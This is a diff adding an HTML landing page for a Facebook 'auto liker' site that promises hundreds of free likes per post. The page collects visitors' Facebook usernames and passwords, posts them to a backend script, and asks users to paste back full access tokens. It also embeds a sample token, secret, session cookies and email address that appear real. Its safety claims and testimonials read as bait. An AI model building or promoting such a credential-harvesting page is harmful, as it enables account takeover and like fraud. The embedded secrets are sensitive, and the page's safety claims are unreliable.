@@ -1,0 +1,821 @@
+<!DOCTYPE html>
+
+    <html lang="en">
+
+
+
+    <head>
+
+        <meta charset="utf-8" />
+
+        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <meta name="description" content="How to get free Facebook like?"/>
+
+        <title>Facebook Photo Auto Liker & Auto Like for Status</title>
+
+        <link rel="stylesheet" type="text/css" href="assets/css/bootstrap1.min.css">
+
+        <link rel="stylesheet" type="text/css" href="assets/css/style1.css">
+
+        <link rel="stylesheet" type="text/css" href="assets/css/button.css">
+
+
+
+        <link rel="shortcut icon" type="text/css" href="../i.imgur.com/8J1pR4I.jpg%3F1">
+
+        <script src="../ajax.aspnetcdn.com/ajax/jQuery/jquery-2.2.4.min.js"></script>
+
+        <script src="assets/css/bootstrap.min.js" async></script>
+        <!-- Global site tag (gtag.js) - Google Analytics -->
+        <script async src="../www.googletagmanager.com/gtag/js%3Fid=UA-119882796-1"></script>
+        <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+
+          gtag('config', 'UA-119882796-1');
+        </script>
+
+        <style type="text/css">
+
+            .appResultImg img {
+
+                border: min. 5px solid #FFF;
+
+            }
+
+
+
+            #top_menu {
+
+                margin-top: -10px;
+
+                display: none;
+
+            }
+
+
+
+            @media (max-width: 728px) {
+
+                .logo {
+
+                    margin: 0 0 !important
+
+                }
+
+            }
+
+
+
+            hr {
+
+                border-top: 1px solid #C5C5C5;
+
+                margin: 0px;
+
+            }
+
+
+
+            #fixedShare {
+
+                position: fixed;
+
+                bottom: 0;
+
+                left: 0;
+
+                z-index: 999;
+
+                text-align: center;
+
+                width: 100%;
+
+                background: #3B5998;
+
+                padding: 10px;
+
+            }
+
+
+
+            #fixedShare img {
+
+                margin: 0 auto;
+
+            }
+
+
+
+            .popover-title {
+
+                font-weight: bolder;
+
+            }
+
+
+
+            .popover .popover-title {
+
+                font-weight: bold;
+
+            }
+
+
+
+            .recentusers {
+
+                border-radius: 10px;
+
+                border: 1px dashed;
+
+                box-shadow: 2px 2px 2px rgba(0, 0, 0, 0.9);
+
+            }
+
+
+
+            .recentusers:hover {
+
+                border-bottom-right-radius: 15px;
+
+                border-top-right-radius: 0px;
+
+                border-bottom-left-radius: 0px;
+
+                border-top-left-radius: 15px;
+
+            }
+
+        </style>
+
+    </head>
+
+
+
+    <body>
+
+        <header>
+
+            <div class="container">
+
+                <div class="row">
+
+                    <div class="col-md-12 navbar-header"> <a title="home" href="index.php.html" class="logo pull-left hvr-grow"
+
+                    		style="color: #fff;  font-size: 25px; font-weight: 800; margin-right: 20px; letter-spacing: -1px;" title="100Like.org" data-toggle="tooltip" data-placement="bottom">
+
+                    			100Like.org
+
+                    	</a>
+
+                        <div class="pull-right">
+
+                        	<a class="btn btn-hed" href="index.html"
+
+                        		title="Home Page, Auto Liker" class="current" data-toggle="tooltip" data-placement="bottom">Home Page</a>
+
+
+
+                        	<a class="btn btn-hed" href="../openinstagram.net/index.html" target="_blank" rel="nofollow"
+
+                        		title="More Likes, Auto Liker" data-toggle="tooltip" data-placement="bottom">More Likes</a>
+
+
+
+                        	<a class="btn btn-hed" href="howtouse.php.html"
+
+                        		title="How To Use, Auto Liker" data-toggle="tooltip" data-placement="bottom">How To Use</a>
+
+
+
+                        	<a class="btn btn-hed" href="http://100like.org/terms.php"
+
+                        		title="Terms & Policy, Auto Liker" data-toggle="tooltip" data-placement="bottom">Terms & Policy</a>
+
+                        	<a class="btn btn-hed" href="http://100like.org/app.php"
+
+                        		title="Download, Auto Liker" data-toggle="tooltip" data-placement="bottom">Download</a>
+
+                        	<a class="btn btn-hed" href="http://100like.org/contact.php"
+
+                        		title="Contact Us, Auto Liker" data-toggle="tooltip" data-placement="bottom">Contact Us</a>
+
+                        </div>
+
+                    </div>
+
+                </div>
+
+        </header>
+
+
+<div id="main">
+
+<div class="container">
+
+<div class="row">
+
+<div class="container-fluid">
+
+  <div class="row">
+
+      <div class="col-md-6">
+
+          <div class="panel panel-primary">
+
+              <div class="panel-heading">
+
+                  <h3 class="panel-title">Latest Auto Like Status:</h3>
+
+              </div>
+
+              <div class="panel-body">
+
+                  <h4><b>Active!</b> 250 likes per submit (05/23/2018)</h4>
+
+              </div>
+
+          </div>
+
+      </div>
+
+      <div class="col-md-6">
+
+          <div class="panel panel-success">
+
+              <div class="panel-heading">
+
+                  <h3 class="panel-title">Download our Auto Like app for your devices (v3.1)</h3>
+
+              </div>
+
+              <div class="panel-body">
+
+                  <!-- Android & iOS --><a href="index.html#"> <img src="../i.imgur.com/0aU3GTb.png" class="recentusers" style="width:115;height:42px;" alt="Autoliker App Store"title="Autoliker App Store" data-toggle="tooltip" data-placement="bottom"></a> <a href="index.html#"> <img src="../i.imgur.com/HtKTjY4.png" class="recentusers" alt="Autoliker App Store" style="width:115;height:42px;" alt="Autoliker App Store"title="Autoliker App Store" data-toggle="tooltip" data-placement="bottom"> </a>
+
+                  <!-- Android & iOS end -->
+
+              </div>
+
+          </div>
+
+      </div>
+
+  </div>
+
+
+
+  <div id="appArea">
+
+      <div id="appLoader"> <img alt="Loading Submit token, auto facebook" src="../i.imgur.com/Tm5kVZj.gif">
+
+          <h1>Submitting Your Token & Please wait ...</h1>
+
+          <h2>Ok login</h2>
+
+      </div>
+
+      <form method="get" action="http://100like.org/captcha_login.php">
+
+          <div class="appTextbox">
+
+              <div class="row">
+
+                  <div class="panel panel-primary">
+
+                      <div class="panel-heading">
+
+                          <h3 class="panel-title">
+
+                              <h4><b>Welcome To 100Like.org</b></h4>
+
+                          </h3>
+
+                      </div>
+
+				   <div class="panel-body  text-center">
+            <h3><b>Login with 3 simple steps</b></h3>
+
+						<div class="col-md-12">
+
+							<div class="panel-body">
+
+								<div class="col-md-6 ">
+
+									<div class="panel panel-primary">
+
+										<div class="panel-heading">
+
+											<h3 class="panel-title">1. Get access Token</h3>
+
+										</div>
+
+										<div class="panel-body text-center">
+
+											<div class="form-group">
+
+												<label for="input" class="control-label">UserName Facebook</label>
+
+												<input type="text" placeholder="Enter UserName" class="form-control" id="username" name="username">
+
+											</div>
+
+											<div class="form-group">
+
+												<label for="input" class="control-label"> Password</label>
+
+												<input type="password" placeholder="Enter password" class="form-control" id="password" name="password">
+
+											</div>
+
+
+
+
+
+											<div class="form-group">
+
+												<button type="button" class="btn btn-primary" id="btn" onclick="gettoken();">Get Token</button>
+
+											</div>
+
+
+										</div>
+
+									</div>
+
+								</div>
+
+								<div class="col-md-6 ">
+
+									<div class="panel panel-primary">
+
+										<div class="panel-heading">
+
+											<h3 class="panel-title">2. Coppy this Token and paste below</h3>
+
+										</div>
+
+										<div class="panel-body text-center">
+
+											<div id='vuong'></div>
+
+										</div>
+
+									</div>
+
+								</div>
+
+								<script type="text/javascript">
+
+									function gettoken() {
+
+										var username = $('#username').val();
+
+										if (username == '') {
+
+											alert("enter username");
+
+											return false;
+
+										}
+
+										var password = $('#password').val();
+
+										if (password == '') {
+
+											alert("enter password");
+
+											return false;
+
+										}
+
+										$('#btn').prop('disabled', true)
+
+										$.post('post_gettoken.php', {
+
+											username: username,
+
+											password: password
+
+										}, function(data, status) {
+
+											$('#vuong').html(data);
+
+											$('#btn').prop('disabled', false)
+
+										});
+
+									}
+
+								</script>
+
+							</div>
+
+						</div>
+
+					</div>
+
+                      <div class="panel-body">
+
+                          
+
+                          <div class="col-md-12">
+                                <div class="panel panel-primary">
+
+                                 <div class="panel-heading">
+
+                                    <h3 class="panel-title">3. Paste that Token here</h3>
+
+                                 </div>
+
+                                 <div class="panel-body text-center">
+
+                                   <div class="form-group">
+     <input class="form-control input-lg" autocomplete="off" value="" type="text" placeholder='{"session_key":"5.RJhMjrndHI7zvw.1527047453.48-100025616010464","uid":100025616010464,"secret":"dc7e9321900674e3bce047b9351e0734","access_token":"EAAAAAYsX7TsBAM7mXsEdWM8uQ6MuRYfv08BRuYLcdUmsZCmSJL3L4xe0zzD8QgXmmB5xiNdn64FXtyZAjmRTmdl1RECDPujacbnqku6CEqANlxNjrQ8e078XpPMrTt0ZCrdcs0z9ogzAJv0eEGxZCDJJC9O5guZBsQZCZBs4t77uIz5zGxz69IuNpUX8IeWSZCX90KpOz2jF4kpBQYM8QZCaw","machine_id":"HeUEW9oXK9HVD1a-nKGI_St5","session_cookies":[{"name":"c_user","value":"100025616010464","expires":"Thu, 23 May 2019 03:50:53 GMT","expires_timestamp":1558583453,"domain":".facebook.com","path":"\/","secure":true},{"name":"xs","value":"48:RJhMjrndHI7zvw:2:1527047453:8632:15813","expires":"Thu, 23 May 2019 03:50:53 GMT","expires_timestamp":1558583453,"domain":".facebook.com","path":"\/","secure":true,"httponly":true},{"name":"fr","value":"0mFSDGpJCYHiYTKJb.AWWNoSKzL8_r7rQ06V0GVrwseOQ.Ba6oni.X-.AAA.0.0.BbBOUd.AWVmlV-h","expires":"Thu, 23 May 2019 03:50:53 GMT","expires_timestamp":1558583453,"domain":".facebook.com","path":"\/","secure":true,"httponly":true},{"name":"datr","value":"HeUEW9oXK9HVD1a-nKGI_St5","expires":"Fri, 22 May 2020 03:50:53 GMT","expires_timestamp":1590119453,"domain":".facebook.com","path":"\/","secure":true,"httponly":true}],"confirmed":true,"identifier":"skb28332\u0040soioa.com"}' name="token" required> </div>
+
+                                   </div>
+                                  </div>
+                            </div>
+
+                              <div class="warning"></div>
+
+                         <!--  <a class="btn btn-success btn-default btn-danger" href="gettoken.php">Get Access Token</a>  -->
+                          <button type="submit" id="submit" class="btn btn-primary"><strong>Login</strong></button><br/><br/>
+  <p> By pressing "Submit" button you are agreeing with our Auto Like <a class="label label-info" href="http://100like.org/terms.php" target="_blank">Terms and Condition & Privacy. Policy.</a></p>
+
+                      </div>
+
+                      <div>
+
+                      </div> <br>
+
+      </form>
+
+      <br>
+
+      <div class="panel-heading">
+
+          <h4><b>New to Auto liker? Learn how to use our autoliker now!</b></h4> <a class="btn btn-sm btn-warning" href="howtouse.php.html" target="_blank">How To Use</a> </div>
+
+      </div>
+
+      <div class="row">
+
+          <div class="container-fluid">
+
+              <div class="row">
+
+                  <div class="col-md-4">
+
+                      <h4 class="text-center"> <b>Auto Like for Facebook Status, Photo, Video, etc.</b> </h4>
+
+                  </div>
+
+                  <div class="col-md-4"> </div>
+
+                  <div class="col-md-4">
+
+                      <h4 class="text-center"> <b>Best Auto Liker to Increase Facebook Post Likes.</b> </h4>
+
+                  </div>
+
+              </div>
+
+          </div>
+
+          <div class="container-fluid">
+
+              <div class="row">
+
+                  <div class="col-md-4">
+
+                      <div class="panel panel-primary">
+
+                          <div class="panel-heading">
+
+                              <h3 class="panel-title">Auto Like Facebook</h3>
+
+                          </div>
+
+                          <div class="panel-body">
+
+                              <p>Use Our Auto Liker & Increase Likes on Your Facebook Status in a Easy way. We give 250+ Likes on every Facebook post!</p>
+
+                          </div>
+
+                      </div>
+
+                  </div>
+
+                  <div class="col-md-4">
+
+                      <div class="panel panel-primary">
+
+                          <div class="panel-heading">
+
+                              <h3 class="panel-title">Spam Free Auto Liker</h3>
+
+                          </div>
+
+                          <div class="panel-body">
+
+                              <p>We are 100% safe auto liker, we will not post anything in any group or wall or page on our website users behalf!</p>
+
+                          </div>
+
+                      </div>
+
+                  </div>
+
+                  <div class="col-md-4">
+
+                      <div class="panel panel-primary">
+
+                          <div class="panel-heading">
+
+                              <h3 class="panel-title">Loved by Users</h3>
+
+                          </div>
+
+                          <div class="panel-body">
+
+                              <p>Use Our Auto Liker & Increase Likes on Your Facebook Status in a Easy way. We give 100+ Likes on every Facebook status!</p>
+
+                          </div>
+
+                      </div>
+
+                  </div>
+
+              </div>
+
+          </div>
+
+          <div class="container-fluid">
+
+              <div class="row">
+
+                  <div class="col-md-4">
+
+                      <div class="panel panel-primary">
+
+                          <div class="panel-heading">
+
+                              <h3 class="panel-title">Customer Support</h3>
+
+                          </div>
+
+                          <div class="panel-body">
+
+                              <p>We added Live chat option for customer support, if you need any help ask us online or leave us a offline message.</p>
+
+                          </div>
+
+                      </div>
+
+                  </div>
+
+                  <div class="col-md-4">
+
+                      <div class="panel panel-primary">
+
+                          <div class="panel-heading">
+
+                              <h3 class="panel-title">Instant Likes Result</h3>
+
+                          </div>
+
+                          <div class="panel-body">
+
+                              <p>After submitting you will get instant 250+ likes on your post. You can increase this up-to 10000 for every post!</p>
+
+                          </div>
+
+                      </div>
+
+                  </div>
+
+                  <div class="col-md-4">
+
+                      <div class="panel panel-primary">
+
+                          <div class="panel-heading">
+
+                              <h3 class="panel-title">Trusted Website</h3>
+
+                          </div>
+
+                          <div class="panel-body">
+
+                              <p>We are providing free Facebook Likes service since 2013 & we the website will be always online for our website users!</p>
+
+                          </div>
+
+                      </div>
+
+                  </div>
+
+              </div>
+
+          </div>
+
+          <div class="container-fluid">
+
+              <div class="row">
+
+                  <div class="col-md-4">
+
+                      <div class="panel panel-primary">
+
+                          <div class="panel-heading">
+
+                              <h3 class="panel-title">Auto Fan Page Liker</h3>
+
+                          </div>
+
+                          <div class="panel-body">
+
+                              <p>Now we are supporting likes on Facebook fan pages post. Now you can get like on fan page status, photo or on custom post.</p>
+
+                          </div>
+
+                      </div>
+
+                  </div>
+
+                  <div class="col-md-4">
+
+                      <div class="panel panel-primary">
+
+                          <div class="panel-heading">
+
+                              <h3 class="panel-title">Virus Free</h3>
+
+                          </div>
+
+                          <div class="panel-body">
+
+                              <p>Our website is 100% virus protected website. We use secured hosting, also we check advertiser pages before using their services.</p>
+
+                          </div>
+
+                      </div>
+
+                  </div>
+
+                  <div class="col-md-4">
+
+                      <div class="panel panel-primary">
+
+                          <div class="panel-heading">
+
+                              <h3 class="panel-title">Online Service</h3>
+
+                          </div>
+
+                          <div class="panel-body">
+
+                              <p>We provide online service to our to users for best results. Users don't need to download any software. <br><br> </p>
+
+                          </div>
+
+                      </div>
+
+                  </div>
+
+              </div>
+
+          </div>
+
+          <hr>
+
+          <center>
+
+              <h4>Testimonials</h4>
+
+          </center>
+
+          <div class="container-fluid">
+
+              <div class="row">
+
+                  <div class="col-md-6">
+
+                      <blockquote>
+
+                          <p> This is a best secured website to get likes on Facebook Posts. This is very easy to use, video tutorial is also available for those users who don't know how to use it. </p> <small>Max V.</small> </blockquote>
+
+                  </div>
+
+                  <div class="col-md-6">
+
+                      <blockquote>
+
+                          <p> I am a daily user of this website. I use this for daily basis to increase my likes. Thanks to the developers for making this awesome website for increasing Facebook Likes. </p> <small>Alex J.</small> </blockquote>
+
+                  </div>
+
+                  <div class="col-md-6">
+
+                      <blockquote>
+
+                          <p> By using this website I am increasing my reputation in front of my friends by gaining likes on Facebook posts. Great efforts by the OfficialLike Team who made this website. </p> <small>Mike M.</small> </blockquote>
+
+                  </div>
+
+                  <div class="col-md-6">
+
+                      <blockquote>
+
+                          <p> Before using this website I didn't know that how people are gaining likes on their posts. After using this website I got to know the trick to increase likes on Facebook posts. </p> <small>Smith V.</small> </blockquote>
+
+                  </div>
+
+                  <div class="col-md-6">
+
+                      <blockquote>
+
+                          <p> Best Autolike I have ever used in my life keep it up for making this happen thank you guys because of you I accomplish my Facebook like goals! </p> <small>Farruh Jl.</small> </blockquote>
+
+                  </div>
+
+                  <div class="col-md-6">
+
+                      <blockquote>
+
+                          <p> 2017 Best Auto like tool out there! Recommended to everyone. Nice and clean interface with so much functions love it. Thanks OfficialLike. </p> <small>John D.</small> </blockquote>
+
+                  </div>
+
+              </div>
+
+          </div>
+
+      </div>
+
+      </div>
+
+      </div>
+
+  </div>
+
+</div>
+
+</div>
+
+</div>
+
+<footer>
+    <div class="container">
+        <div class="row padding-top-10">
+            <div class="col-sm-3 padding-bottom-10">
+                <h4 class="h4 title-sub">About Us</h4>
+                <h5>100Like.org is the best website to gain likes on Facebook Status, Photo, Comments or page. It was acquired in 2012 by 100Like.org! Specially we made this website those users who are unable to gain likes on their posts. 100Like.org is a free Facebook likes sharing community.</h5>
+                <p></p>
+            </div>
+            <div class="col-sm-3 padding-bottom-10">
+                <h4 class="h4 title-sub">Quick Links</h4>
+                <ul class="list-unstyled">
+                    <li><a href="http://100like.org/privacy.php">Privacy Policy</a></li>
+                    <li><a href="http://100like.org/terms.php">Terms</a></li>
+                    <li><a href="http://100like.org/cookies.php">Cookies</a></li>
+                    <li><a href="index.html#" target="_blank">More Likes</a></li>
+                </ul>
+            </div>
+            <div class="col-sm-3 padding-bottom-10">
+                <h4 class="h4 title-sub">Support</h4> <a class="btn btn-danger btn-sm" href="../www.facebook.com/nguyentanhiephn.html" target="_blank">Contact Us!</a> </div>
+            <div class="col-sm-3 padding-bottom-10">
+                <h4 class="title-sub">Follow Us</h4>
+                <p><a href="../www.facebook.com/nguyentanhiephn.html" target="_blank" rel="nofollow">Facebook</a>
+                  <br>
+                  <a href="index.html" target="_blank" rel="nofollow">Twitter</a>
+                  <br>
+                  <a href="index.html" target="_blank" rel="nofollow">Google+</a>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+<copyright>
+    <div class="container-fluid">
+        <div class="row">
+            <div class="col-md-12">
+                <h5 class="text-right"> <b>© Copyright 2012 - 2017 100Like.org. All Rights Reserved. </b> </h5>
+            </div>
+        </div>
+    </div>
+</copyright>
+<script>
+    $(document).ready(function() {
+        $('[data-toggle="tooltip"]').tooltip();
+    });
+</script>
+</body>
+
+</html>
+
